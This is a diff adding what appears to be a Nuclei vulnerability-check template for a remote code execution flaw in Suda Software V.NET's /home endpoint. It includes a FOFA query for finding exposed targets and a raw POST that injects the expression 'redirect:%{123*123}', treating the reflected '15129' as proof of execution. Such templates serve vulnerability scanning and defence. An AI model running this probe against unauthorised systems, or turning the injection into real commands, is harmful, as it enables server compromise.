@@ -1,0 +1,27 @@
+id: suda-software-vnet-home-rce
+
+info:
+  name: "速达软件 V.NET home 接口组件远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="速达软件技术（广州）有限公司"||app="速达软件-公司产品"
+          速达软件 V.NET home接口组件存在远程代码执行漏洞，攻击者可通过该漏洞执行任意系统命令，进而获取服务器敏感数据，最终导致系统控制权丧失。
+  tags: 速达软件
+
+http:
+- raw:
+  - |
+    POST /home HTTP/1.1
+    Host: {{Hostname}}
+    Content-type: application/x-www-form-urlencoded
+
+    redirect:%25{123*123}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [302]
+  - type: word
+    part: body
+    words:
+    - '15129'
